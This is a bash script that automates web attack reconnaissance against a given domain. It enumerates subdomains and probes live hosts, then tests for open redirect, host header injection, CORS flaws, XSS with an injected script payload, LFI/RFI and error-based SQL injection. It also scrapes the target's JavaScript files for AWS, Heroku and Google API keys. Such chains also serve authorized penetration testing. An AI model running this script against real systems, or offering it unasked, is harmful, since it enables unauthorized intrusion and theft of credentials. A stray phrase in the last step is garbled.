#!/bin/bash

# Function to display usage information
usage() {
    echo "Usage: $0 -u <domain>"
    exit 1
}

# Check if there are no arguments provided
if [ $# -eq 0 ]; then
    usage
fi

# Parse command line options
while getopts ":u:" opt; do
    case ${opt} in
        u )
            domain=$OPTARG
            ;;
        \? )
            echo "Invalid option: $OPTARG" 1>&2
            usage
            ;;
        : )
            echo "Invalid option: $OPTARG requires an argument" 1>&2
            usage
            ;;
    esac
done
shift $((OPTIND -1))

# Check if domain is provided
if [ -z "$domain" ]; then
    echo "Domain is required"
    usage
fi

echo "[+] Step 1: Running spyhunt.py to find subdomains for $domain..."
python3 ~/tools/spyhunt/spyhunt.py -s "$domain" --save subdomains

echo "[+] Step 2: Checking for live subdomains using httpx-toolkit..."
httpx-toolkit -l subdomains -ports 80,443,8000,8080,8888 -mc 200,403,400,500 -threads 200 -o alivesubs 

echo "[+] Step 3: Openredirect Check"
python3 Resources/Openredirect.py $domain

echo "[+] Step 4: Host Header Injection scan"
bash Resources/HostHeaderScan.sh -l alivesubs > hhiscan

echo "[+] Step 5: Cors Exploit scan"
python3 ~/tools/Corsy/corsy.py -i alivesubs > CorsyScan

echo "[+] Step 6: Crawling Parameters and filtering them"
cat alivesubs | gau --threads 5 > links

echo "[+] Step 7: Filtering JS links and finding sensitive data in them"
cat links | grep ".js$" > jsfiles.txt
cat jsfiles.txt | while read url; do python3 ~/tools/SecretFinder/SecretFinder.py -i $url -o cli >> secret.txt; done
cat secret.txt | grep aws > awsapi.txt
cat secret.txt | grep Heroku > herokuapi.txt
cat secret.txt | grep google > googleapi.txt

echo "[+] Step 8: Filtering XSS parameters and Testing Target on XSS"
cat links | gf xss > xsslinks
cat xsslinks | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln

echo "[+] Step 9: Filtering LFI parameters and Testing Target on LFI/RFi/Data Traversal"
cat links | gf lfi > lfilinks
nuclei -l lfilinks -tags lfi,rfi

echo "[+] Step 10: SQLI Scan (niakos pativiscemit)"
cat links | gf sqli > sqlilinks
python3 Resources/ErrorBasedSqli.py
